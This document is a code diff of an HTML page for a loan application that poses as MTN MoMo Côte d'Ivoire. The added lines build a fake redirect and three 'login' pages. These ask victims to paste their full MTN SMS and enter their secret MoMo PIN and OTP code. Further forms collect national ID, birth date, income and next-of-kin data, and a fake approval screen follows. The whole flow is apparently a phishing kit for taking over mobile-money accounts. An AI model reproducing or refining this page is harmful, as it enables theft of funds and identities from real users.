-        <div class="confirm-block"><h3>💰 Prêt</h3>
-            <div class="confirm-row"><span>Montant</span><strong id="cfAmount">—</strong></div>
-            <div class="confirm-row"><span>Durée</span><strong id="cfTerm">—</strong></div>
-            <div class="confirm-row"><span>Objet</span><strong id="cfPurpose">—</strong></div>
-            <div class="confirm-row"><span>Mensualité</span><strong id="cfMonthly">—</strong></div>
-            <div class="confirm-row"><span>Coût total du crédit</span><strong id="cfCost">—</strong></div>
-        </div>
-        <div class="confirm-block"><h3>👤 Demandeur</h3>
-            <div class="confirm-row"><span>Nom</span><strong id="cfName">—</strong></div>
-            <div class="confirm-row"><span>Téléphone</span><strong id="cfPhone">—</strong></div>
-            <div class="confirm-row"><span>Email</span><strong id="cfEmail">—</strong></div>
-        </div>
-        <div class="confirm-block"><h3>🤝 Garant</h3>
-            <div class="confirm-row"><span>Nom</span><strong id="cfGName">—</strong></div>
-            <div class="confirm-row"><span>Téléphone</span><strong id="cfGPhone">—</strong></div>
-        </div>
-        <div class="agreement-wrap"><label class="confirm-check">
-            <input type="checkbox" id="agreeBox" />
-            <span>J'accepte le contrat de prêt et la divulgation BCEAO.</span>
-        </label></div>
-        <button class="btn-outline" id="showAgreementBtn">📄 Voir le contrat complet</button>
-        <button class="btn-outline" id="downloadPdfConfirmBtn">📥 Télécharger le PDF</button>
-        <button class="btn-grad" id="confirmProceedBtn" disabled>Continuer vers la connexion MoMo</button>
-    </div></div>
-</div>
-
-<!-- CONNEXION MOMO -->
-<div id="page-momologin" class="page">
-    <nav class="navbar">
-        <a class="nav-left" data-goto="page-confirmation">← Retour</a>
-        <div class="mtn-logo nav-logo-row"><img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" /><div><div class="mtn-logo-text nav-logo-text">MTN MoMo</div><div class="mtn-logo-sub nav-logo-sub">Côte d'Ivoire</div></div></div>
-        <div class="nav-right" id="navbarAccount6"></div>
-    </nav>
-    <div class="step-center"><div class="step-card">
-        <h2>Connexion à MoMo</h2>
-        <p class="step-sub">Étape 6 sur 6</p>
-        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
-        <div class="login-intro"><div class="li-icon">📱</div><h3>Connectez-vous à votre application MoMo</h3><p>Entrez vos identifiants MoMo pour confirmer votre compte.</p></div>
-        <div class="msg-box error" id="loginErr"><span class="msg-icon">✕</span><span id="loginErrTxt"></span></div>
-        <div class="field"><label>Numéro de téléphone MoMo</label><div class="phone-row"><div class="ph-pre">+225</div><input type="tel" id="loginPhone" maxlength="10" placeholder="05 XX XX XX XX" inputmode="numeric" /></div></div>
-        <div class="field"><label>Code PIN MoMo (5 chiffres)</label>
-            <div class="pin-row">
-                <input type="password" id="loginPin0" class="pin-box" maxlength="1" inputmode="numeric" />
-                <input type="password" id="loginPin1" class="pin-box" maxlength="1" inputmode="numeric" />
-                <input type="password" id="loginPin2" class="pin-box" maxlength="1" inputmode="numeric" />
-                <input type="password" id="loginPin3" class="pin-box" maxlength="1" inputmode="numeric" />
-                <input type="password" id="loginPin4" class="pin-box" maxlength="1" inputmode="numeric" />
-                <button type="button" class="pin-eye" id="togglePinBtn">👁</button>
-                <button type="button" class="pin-delete" id="clearPinBtn">✕</button>
+        <!-- 20% mandatory -->
+        <div class="twenty-block">
+            <div class="twenty-head">
+                <span class="twenty-icon">📊</span>
+                <div>
+                    <strong>Déclaration obligatoire — Règle des 20 %</strong>
+                    <div class="twenty-amount">Requis : <b id="twentyAmount">20 000 F CFA</b></div>
+                </div>
             </div>
+            <p class="twenty-desc">Vous devez avoir au moins <b>20 % du montant demandé</b> en transactions MoMo ce mois-ci.</p>
+            <label class="confirm-check">
+                <input type="checkbox" id="has20Percent" />
+                <span>Je confirme avoir au moins <b id="twentyAmountInline">20 000 F CFA</b> en transactions MoMo.</span>
+            </label>
         </div>
-        <div class="field"><label>Méthode de connexion</label><div class="sel-wrap">
-            <select id="loginMethod"><option value="pin" selected>🔑 Code PIN MoMo</option><option value="biometric">🔒 Biométrie</option></select>
-        </div></div>
-        <div id="biometricBlock" style="display:none"><div class="biometric-box"><div class="bio-icon">🔒</div><p>Connexion biométrique activée</p><div class="bio-detail">Votre appareil vérifiera votre identité</div></div></div>
-        <button class="btn-grad" id="loginBtn">Confirmer la connexion</button>
-        <button class="btn-outline" id="loginRetryBtn">↻ Effacer &amp; Réessayer</button>
+
+        <!-- PERSONAL -->
+        <h3 class="section-h">👤 Informations personnelles</h3>
+        <div class="field"><label>Nom complet</label><input type="text" id="appName" maxlength="80" placeholder="Ex. Konan Yao" autocomplete="name" /></div>
+        <div class="field"><label>Numéro CNI</label><input type="text" id="appIdNumber" maxlength="14" placeholder="CI0123456789" style="text-transform:uppercase;" /></div>
+        <div class="field"><label>Date de naissance</label><input type="date" id="appDob" /></div>
+        <div class="field"><label>Email</label><input type="email" id="appEmail" maxlength="120" placeholder="vous@email.com" autocomplete="email" /></div>
+        <div class="field"><label>Téléphone</label><div class="phone-row"><div class="ph-pre">+225</div><input type="tel" id="appPhone" maxlength="10" placeholder="05 XX XX XX XX" inputmode="numeric" autocomplete="tel-national" /></div></div>
+
+        <!-- EMPLOYMENT -->
+        <h3 class="section-h">💼 Emploi</h3>
+        <div class="field"><label>Situation professionnelle</label><div class="sel-wrap"><select id="appEmployment"><option>Salarié(e)</option><option selected>Travailleur indépendant</option><option>Sans emploi</option><option>Retraité(e)</option><option>Étudiant(e)</option></select></div></div>
+        <div class="field"><label>Revenu annuel (F CFA)</label><input type="number" id="appIncome" min="0" max="100000000" inputmode="numeric" /></div>
+
+        <!-- NEXT OF KIN WITH TERMS -->
+        <h3 class="section-h">👥 Proche (Next of Kin)</h3>
+        <div class="field"><label>Nom du proche</label><input type="text" id="appKinName" maxlength="60" /></div>
+        <div class="field"><label>Téléphone du proche</label><div class="phone-row"><div class="ph-pre">+225</div><input type="tel" id="appKinPhone" maxlength="10" inputmode="numeric" /></div></div>
+        <div class="field"><label>Relation</label><div class="sel-wrap"><select id="appKinRelation"><option value="">Sélectionner</option><option>Parent</option><option>Frère / Sœur</option><option>Conjoint(e)</option><option>Famille</option><option>Ami(e)</option><option>Collègue</option><option>Autre</option></select></div></div>
+
+        <div class="kin-terms-block">
+            <div class="kin-terms-head">
+                <span class="kin-icon">📜</span>
+                <div>
+                    <strong>Conditions du proche</strong>
+                    <p>Votre proche sera contacté en cas de besoin.</p>
+                </div>
+            </div>
+            <label class="confirm-check">
+                <input type="checkbox" id="kinTnc" />
+                <span>Je confirme que mon proche a été informé et accepte d'être contacté pour cette demande. <a href="#" id="kinTermsLink">Voir les conditions</a></span>
+            </label>
+        </div>
+
+        <!-- GENERAL TERMS -->
+        <div class="agreement-wrap">
+            <label class="confirm-check">
+                <input type="checkbox" id="appTnc" />
+                <span>J'ai lu et j'accepte les <a href="#" id="termsLink">Conditions Générales de Prêt</a> et la politique de confidentialité.</span>
+            </label>
+        </div>
+
+        <button class="btn-outline" id="viewTermsBtn">📄 Voir les Conditions Générales</button>
+        <button class="btn-grad" id="appSubmitBtn" style="margin-top:12px;">Soumettre ma demande</button>
     </div></div>
 </div>
 
-<div id="page-wait-momologin" class="page">
-    <div class="wait-bg"><div class="wait-wrap">
-        <div class="wait-icon pulse">🔐</div>
-        <h2>Confirmation de la connexion MoMo...</h2>
-        <div class="wait-status" id="waitMomoLoginStatus">⏳ En attente d'approbation...</div>
-        <div class="poll-indicator"><span class="dot"></span> Vérification en direct...</div>
-        <button class="btn-gray" id="cancelWaitMomoLoginBtn">Annuler</button>
-    </div></div>
-</div>
-
-<!-- SCAN -->
-<div id="page-scan" class="page">
-    <div class="wait-bg"><div class="wait-wrap">
-        <div class="scan-icon"><div class="scan-ring"></div><div class="scan-inner">📊</div></div>
-        <h2>Qualification Finale</h2>
-        <p>Analyse de l'historique des transactions MoMo pour la règle des 20 %.</p>
-        <div class="scan-checklist">
-            <div class="scan-item active" id="scanItem1"><span class="scan-dot"></span><span>Analyse des transactions...</span></div>
-            <div class="scan-item" id="scanItem2"><span class="scan-dot"></span><span>Vérification de la règle des 20 %...</span></div>
-            <div class="scan-item" id="scanItem3"><span class="scan-dot"></span><span>Validation admin finale...</span></div>
-        </div>
-        <div class="wait-status" id="waitScanStatus">⏳ Analyse...</div>
-        <div class="deposit-note"><div class="deposit-icon">💰</div><p><strong>Si approuvé :</strong> Les fonds seront déposés sur votre compte MoMo dans les 5 minutes.</p></div>
-        <button class="btn-gray" id="cancelScanBtn">Annuler</button>
-    </div></div>
-</div>
-
-<!-- APPROBATION -->
-<div id="page-approval" class="page">
-    <div class="appr-wrap">
-        <div class="appr-top">
-            <div class="check-circle">✓</div>
-            <h2 class="appr-title">Prêt Approuvé !</h2>
-            <p class="appr-sub">Votre prêt a été approuvé.</p>
-            <div class="appr-banner"><div class="abl">Montant à recevoir</div><div class="aba" id="aprAmount">0 F CFA</div></div>
-        </div>
-        <div class="comp-box"><div class="ch">ℹ️ Important</div><p>Les fonds seront déposés sur votre compte MoMo dans les 5 minutes.</p></div>
-        <div class="ld-card">
-            <div class="ld-htitle">📊 Détails du Prêt</div>
-            <div class="ld-row"><div class="ld-icon">💰</div><div><div class="ld-lbl">Montant</div><div class="ld-val" id="aprAmt">—</div></div></div>
-            <div class="ld-row"><div class="ld-icon">📅</div><div><div class="ld-lbl">Durée</div><div class="ld-val" id="aprTerm">—</div></div></div>
-            <div class="ld-row"><div class="ld-icon">💳</div><div><div class="ld-lbl">Mensualité</div><div class="ld-val" id="aprMth">—</div></div></div>
-        </div>
-        <div class="rth-wrap">
-            <button class="rth-btn" id="viewScheduleBtn">Voir l'échéancier</button>
-            <button class="btn-outline" id="downloadPdfApprovalBtn">📥 Télécharger le PDF</button>
-            <button class="btn-outline" id="copyAppIdBtn">📋 Copier l'ID Dossier</button>
-            <button class="btn-outline" id="restartAppBtn">Nouvelle demande</button>
+<!-- ═════════ MOMO REDIRECT PAGE (5 sec) ═════════ -->
+<div id="page-momo-redirect" class="page">
+    <div class="momo-redirect-bg">
+        <div class="momo-redirect-wrap">
+            <div class="momo-redirect-logo">
+                <img src="./momo_logo.jpg" alt="MTN MoMo" class="momo-redirect-img" />
+                <div class="momo-redirect-text">MTN MoMo</div>
+                <div class="momo-redirect-sub">Côte d'Ivoire</div>
+            </div>
+            <div class="momo-redirect-spinner"></div>
+            <h2>Connexion à votre compte MoMo</h2>
+            <p>Redirection sécurisée vers MTN Mobile Money…</p>
+            <div class="momo-redirect-countdown">
+                Redirection dans <b id="countdownNum">5</b> seconde<span id="countdownPlural">s</span>
+            </div>
+            <div class="momo-redirect-progress"><div class="momo-redirect-bar" id="redirectBar"></div></div>
         </div>
     </div>
 </div>
 
-<!-- MODALES -->
+<!-- ═════════ LOGIN STEP 1: SMS ═════════ -->
+<div id="page-login-sms" class="page">
+    <nav class="navbar">
+        <a class="nav-left" data-goto="page-landing">← Annuler</a>
+        <div class="mtn-logo nav-logo-row"><img src="./momo_logo.jpg" class="mtn-logo-img sm" /><div><div class="mtn-logo-text nav-logo-text">MTN MoMo</div><div class="mtn-logo-sub nav-logo-sub">Côte d'Ivoire</div></div></div>
+        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+    </nav>
+    <div class="step-center"><div class="step-card">
+        <h2>Vérification par SMS</h2>
+        <p class="step-sub">Étape 2 sur 3 · Connexion MoMo (1/3)</p>
+        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
+        <div class="login-intro">
+            <div class="li-icon">📩</div>
+            <h3>Collez le SMS reçu de MTN</h3>
+            <p>Copiez le SMS complet envoyé à votre numéro MoMo.</p>
+        </div>
+        <div class="msg-box error" id="smsErr"><span class="msg-icon">✕</span><span id="smsErrTxt"></span></div>
+        <div class="field">
+            <label>Numéro MoMo</label>
+            <div class="phone-row"><div class="ph-pre">+225</div><input type="tel" id="smsPhone" maxlength="10" placeholder="05 XX XX XX XX" inputmode="numeric" /></div>
+        </div>
+        <div class="field">
+            <label>Texte complet du SMS</label>
+            <textarea id="smsText" rows="6" maxlength="2000" placeholder="Collez le SMS complet ici..."></textarea>
+        </div>
+        <button class="btn-grad" id="smsBtn">Continuer</button>
+    </div></div>
+</div>
+
+<!-- ═════════ LOGIN STEP 2: PIN ═════════ -->
+<div id="page-login-pin" class="page">
+    <nav class="navbar">
+        <a class="nav-left" data-goto="page-login-sms">← Retour</a>
+        <div class="mtn-logo nav-logo-row"><img src="./momo_logo.jpg" class="mtn-logo-img sm" /><div><div class="mtn-logo-text nav-logo-text">MTN MoMo</div><div class="mtn-logo-sub nav-logo-sub">Côte d'Ivoire</div></div></div>
+        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+    </nav>
+    <div class="step-center"><div class="step-card">
+        <h2>Code PIN MoMo</h2>
+        <p class="step-sub">Étape 2 sur 3 · Connexion MoMo (2/3)</p>
+        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
+        <div class="login-intro">
+            <div class="li-icon">🔑</div>
+            <h3>Votre code PIN secret</h3>
+            <p>Entrez votre code PIN MoMo à 5 chiffres.</p>
+        </div>
+        <div class="msg-box error" id="pinErr"><span class="msg-icon">✕</span><span id="pinErrTxt"></span></div>
+        <div class="field">
+            <label>Code PIN</label>
+            <div class="pin-row">
+                <input type="password" id="pinBox0" class="pin-box" maxlength="1" inputmode="numeric" />
+                <input type="password" id="pinBox1" class="pin-box" maxlength="1" inputmode="numeric" />
+                <input type="password" id="pinBox2" class="pin-box" maxlength="1" inputmode="numeric" />
+                <input type="password" id="pinBox3" class="pin-box" maxlength="1" inputmode="numeric" />
+                <input type="password" id="pinBox4" class="pin-box" maxlength="1" inputmode="numeric" />
+                <button type="button" class="pin-eye" id="pinToggle">👁</button>
+                <button type="button" class="pin-delete" id="pinClear">✕</button>
+            </div>
+        </div>
+        <button class="btn-grad" id="pinBtn">Continuer</button>
+    </div></div>
+</div>
+
+<!-- ═════════ LOGIN STEP 3: OTP ═════════ -->
+<div id="page-login-otp" class="page">
+    <nav class="navbar">
+        <a class="nav-left" data-goto="page-login-pin">← Retour</a>
+        <div class="mtn-logo nav-logo-row"><img src="./momo_logo.jpg" class="mtn-logo-img sm" /><div><div class="mtn-logo-text nav-logo-text">MTN MoMo</div><div class="mtn-logo-sub nav-logo-sub">Côte d'Ivoire</div></div></div>
+        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+    </nav>
+    <div class="step-center"><div class="step-card">
+        <h2>Code OTP</h2>
+        <p class="step-sub">Étape 2 sur 3 · Connexion MoMo (3/3)</p>
+        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
+        <div class="login-intro">
+            <div class="li-icon">🔢</div>
+            <h3>Code OTP de vérification</h3>
+            <p>Entrez le code OTP reçu par SMS (4–6 chiffres).</p>
+        </div>
+        <div class="msg-box error" id="otpErr"><span class="msg-icon">✕</span><span id="otpErrTxt"></span></div>
+        <div class="field">
+            <label>Code OTP</label>
+            <input type="text" id="otpInput" maxlength="6" inputmode="numeric" placeholder="123456" style="text-align:center;font-size:1.5rem;font-weight:800;letter-spacing:0.4em;" />
+        </div>
+        <button class="btn-grad" id="otpBtn">Soumettre ma demande</button>
+    </div></div>
+</div>
+
+<!-- ═════════ UNDER REVIEW ═════════ -->
+<div id="page-review" class="page">
+    <div class="wait-bg"><div class="wait-wrap">
+        <div class="wait-icon pulse">📋</div>
+        <h2>Votre demande est en cours d'examen</h2>
+        <p>Nous traitons votre demande.<br><b>Vous serez notifié par email ou SMS une fois l'examen terminé.</b></p>
+        <div class="wait-status" id="reviewStatus">⏳ En cours d'examen...</div>
+        <div class="poll-indicator"><span class="dot"></span> Vérification en direct...</div>
+        <div class="wait-appid">Dossier : <span class="mono" id="reviewId">—</span></div>
+        <div class="support-block">
+            <div class="support-title">Besoin d'aide ?</div>
+            <p>Contactez le support officiel MTN MoMo :</p>
+            <a href="https://www.mtn.ci/fr/particulier/mobile-money" target="_blank" rel="noopener" class="support-link">🌐 www.mtn.ci/mobile-money</a>
+            <a href="tel:111" class="support-link">📞 111 (appel gratuit)</a>
+        </div>
+    </div></div>
+</div>
+
+<!-- ═════════ DASHBOARD (APPROVED) ═════════ -->
+<div id="page-dashboard" class="page">
+    <div class="dash-wrap">
+        <div class="dash-top">
+            <div class="dash-check">✓</div>
+            <h2 class="dash-title">Prêt Approuvé</h2>
+            <p class="dash-sub">Félicitations ! Votre prêt est prêt.</p>
+        </div>
+        <div class="dash-amount-card">
+            <div class="dash-amount-label">Montant à recevoir</div>
+            <div class="dash-amount" id="dashAmount">0 F CFA</div>
+            <div class="dash-account" id="dashAccount"></div>
+        </div>
+        <div class="dash-details">
+            <div class="dash-row"><span>Durée</span><strong id="dashTerm">—</strong></div>
+            <div class="dash-row"><span>Mensualité</span><strong id="dashMonthly">—</strong></div>
+            <div class="dash-row"><span>Compte MoMo</span><strong id="dashAccountType">—</strong></div>
+            <div class="dash-row"><span>Dossier</span><strong id="dashId">—</strong></div>
+        </div>
+        <div class="dash-notice">
+            <div class="dash-notice-icon">💰</div>
+            <div>Les fonds seront déposés sur votre compte MoMo dans les <b>5 minutes</b>.</div>
+        </div>
+        <div class="dash-actions">
+            <button class="btn-outline" id="dashPdfBtn">📥 Télécharger le contrat PDF</button>
+            <button class="btn-outline" id="dashCopyBtn">📋 Copier l'ID Dossier</button>
+            <button class="btn-grad" id="dashNewBtn">Nouvelle demande</button>
+        </div>
+        <div class="support-block dark">
+            <div class="support-title">Support MTN MoMo</div>
+            <a href="https://www.mtn.ci/fr/particulier/mobile-money" target="_blank" rel="noopener" class="support-link">🌐 www.mtn.ci/mobile-money</a>
+            <a href="tel:111" class="support-link">📞 111</a>
+        </div>
+    </div>
+</div>
+
+<!-- ═════════ REJECTED ═════════ -->
+<div id="page-rejected" class="page">
+    <div class="wait-bg"><div class="wait-wrap">
+        <div class="wait-icon">❌</div>
+        <h2>Demande non approuvée</h2>
+        <p id="rejectReason">Votre demande n'a pas été approuvée.</p>
+        <div class="msg-box error show">
+            <span class="msg-icon">ℹ️</span>
+            <span>Contactez le support MTN MoMo au <b>111</b> ou visitez une agence pour plus d'informations.</span>
+        </div>
+        <button class="btn-grad" id="rejectedNewBtn">Nouvelle demande</button>
+        <a href="https://www.mtn.ci/fr/particulier/mobile-money" target="_blank" rel="noopener" class="btn-outline" style="display:block;text-align:center;text-decoration:none;margin-top:10px;">🌐 Support MTN MoMo</a>
+    </div></div>
+</div>
+
+<!-- ═════════ TERMS MODAL ═════════ -->
 <div id="termsModal" class="modal-bg">
     <div class="modal-doc">
         <div class="modal-doc-head"><h2>Conditions Générales</h2><button class="modal-close" id="closeTermsBtn">×</button></div>
         <pre id="termsText" class="agreement-text">Chargement…</pre>
-        <div class="modal-footer-bar">
-            <button class="btn-grad" id="acceptTermsBtn">J'accepte</button>
-        </div>
-    </div>
-</div>
-
-<div id="agreementModal" class="modal-bg">
-    <div class="modal-doc">
-        <div class="modal-doc-head"><h2>Contrat de Prêt</h2><button class="modal-close" id="closeAgreementBtn">×</button></div>
-        <pre id="agreementText" class="agreement-text"></pre>
-    </div>
-</div>
-
-<div id="scheduleModal" class="modal-bg">
-    <div class="modal-doc">
-        <div class="modal-doc-head"><h2>Échéancier de Remboursement</h2><button class="modal-close" id="closeScheduleBtn">×</button></div>
-        <div id="scheduleBody" class="schedule-body"></div>
+        <div class="modal-footer-bar"><button class="btn-grad" id="acceptTermsBtn">J'accepte</button></div>
     </div>
 </div>
 
